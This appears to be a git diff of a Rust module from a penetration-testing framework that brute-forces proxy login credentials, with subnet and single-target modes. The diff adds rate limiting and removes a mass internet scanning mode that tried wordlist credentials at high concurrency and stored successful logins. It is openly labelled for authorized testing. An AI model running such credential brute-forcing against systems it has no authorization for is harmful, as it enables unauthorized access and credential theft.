@@ -5,24 +5,34 @@
 //!
 //! FOR AUTHORIZED PENETRATION TESTING ONLY.
 
-use anyhow::{anyhow, Result};
+use anyhow::{ anyhow, Context, Result };
 use colored::*;
 use std::net::IpAddr;
-use std::sync::Arc;
 use std::time::Duration;
 use base64::Engine as _;
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::io::{ AsyncReadExt, AsyncWriteExt };
 
+use crate::module::{ ModuleCtx, ModuleOutcome };
 use crate::utils::{
-    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range,
-    cfg_prompt_output_file, cfg_prompt_port, cfg_prompt_yes_no,
-    load_lines, normalize_target,
+    cfg_prompt_default,
+    cfg_prompt_existing_file,
+    cfg_prompt_int_range,
+    cfg_prompt_output_file,
+    cfg_prompt_port,
+    cfg_prompt_yes_no,
+    load_lines,
+    normalize_target,
 };
 use crate::utils::{
-    generate_combos_mode, parse_combo_mode, load_credential_file,
-    BruteforceConfig, LoginResult, SubnetScanConfig,
-    run_bruteforce, run_subnet_bruteforce,
-    is_mass_scan_target, is_subnet_target, run_mass_scan, MassScanConfig,
+    generate_combos_mode,
+    parse_combo_mode,
+    load_credential_file,
+    BruteforceConfig,
+    LoginResult,
+    SubnetScanConfig,
+    run_bruteforce,
+    run_subnet_bruteforce,
+    is_subnet_target,
 };
 
 pub fn info() -> crate::module_info::ModuleInfo {
@@ -241,56 +251,11 @@ fn display_banner() {
     crate::mprintln!();
 }
 
-pub async fn run(target: &str) -> Result<()> {
-    // --- Mass scan ---
-    if is_mass_scan_target(target) {
-        let proxy_type_input = cfg_prompt_default("proxy_type", "Proxy type (http_connect/socks5/http_forward)", "http_connect").await?;
-        let proxy_type = ProxyType::from_str(&proxy_type_input);
-        let users_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
-        let pass_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
-        let users = Arc::new(load_lines(&users_file)?);
-        let passes = Arc::new(load_lines(&pass_file)?);
-        if users.is_empty() { return Err(anyhow!("Username list empty")); }
-        if passes.is_empty() { return Err(anyhow!("Password list empty")); }
-
-        return run_mass_scan(target, MassScanConfig {
-            protocol_name: "Proxy",
-            default_port: proxy_type.default_port(),
-            state_file: "proxy_brute_mass_state.log",
-            default_output: "proxy_brute_mass_results.txt",
-            default_concurrency: 200,
-        }, move |ip: IpAddr, port: u16| {
-            let users = users.clone();
-            let passes = passes.clone();
-            async move {
-                // Quick connectivity check
-                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
-                    return None;
-                }
-                let t = ip.to_string();
-                for user in users.iter() {
-                    for pass in passes.iter() {
-                        match try_proxy_auth(proxy_type, &t, port, user, pass, 5000).await {
-                            LoginResult::Success => {
-                                let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
-                                let msg = format!("[{}] {}:{} {} auth: {}:{}", ts, ip, port, proxy_type.name(), user, pass);
-                                crate::mprintln!("\r{}", format!("[+] FOUND: {}:{} {}:{}", ip, port, user, pass).green().bold());
-                                crate::cred_store::store_credential(
-                                    &t, port, &format!("proxy-{}", proxy_type.name().to_lowercase()),
-                                    user, pass, crate::cred_store::CredType::Password,
-                                    "creds/generic/proxy_credcheck",
-                                ).await;
-                                return Some(format!("{}\n", msg));
-                            }
-                            LoginResult::AuthFailed => continue,
-                            LoginResult::Error { .. } => break, // host issue, skip
-                        }
-                    }
-                }
-                None
-            }
-        }).await;
-    }
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("proxy_bruteforce requires a single-host target")?;
 
     // --- Subnet scan ---
     if is_subnet_target(target) {
@@ -307,7 +272,9 @@ pub async fn run(target: &str) -> Result<()> {
         let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
         let output_file = cfg_prompt_output_file("output_file", "Output file", "proxy_brute_subnet.txt").await?;
 
-        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
+        let limiter = ctx.limiter.clone();
+        let module_path = ctx.module_path.clone();
+        run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
             concurrency,
             verbose,
             output_file,
@@ -315,11 +282,17 @@ pub async fn run(target: &str) -> Result<()> {
             jitter_ms: 50,
             source_module: "creds/generic/proxy_credcheck",
             skip_tcp_check: false,
+            state_file: None,
         }, move |ip: IpAddr, port: u16, user: String, pass: String| {
+            let limiter = limiter.clone();
+            let module_path = module_path.clone();
             async move {
-                try_proxy_auth(proxy_type, &ip.to_string(), port, &user, &pass, 5000).await
+                let host = ip.to_string();
+                limiter.acquire(&module_path, &host).await;
+                try_proxy_auth(proxy_type, &host, port, &user, &pass, 5000).await
             }
-        }).await;
+        }).await?;
+        return Ok(ModuleOutcome::ok());
     }
 
     // --- Single target ---
@@ -354,6 +327,8 @@ pub async fn run(target: &str) -> Result<()> {
     crate::mprintln!("[*] Combos: {}", combos.len());
     crate::mprintln!();
 
+    let limiter = ctx.limiter.clone();
+    let module_path = ctx.module_path.clone();
     let result = run_bruteforce(
         &BruteforceConfig {
             target: normalized,
@@ -369,7 +344,10 @@ pub async fn run(target: &str) -> Result<()> {
         },
         combos,
         move |target: String, port: u16, user: String, pass: String| {
+            let limiter = limiter.clone();
+            let module_path = module_path.clone();
             async move {
+                limiter.acquire(&module_path, &target).await;
                 try_proxy_auth(proxy_type, &target, port, &user, &pass, timeout_ms).await
             }
         },
@@ -378,5 +356,7 @@ pub async fn run(target: &str) -> Result<()> {
     result.print_found();
     result.save_to_file(&save_path)?;
 
-    Ok(())
+    Ok(ModuleOutcome::ok())
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "generic/proxy_bruteforce", native);
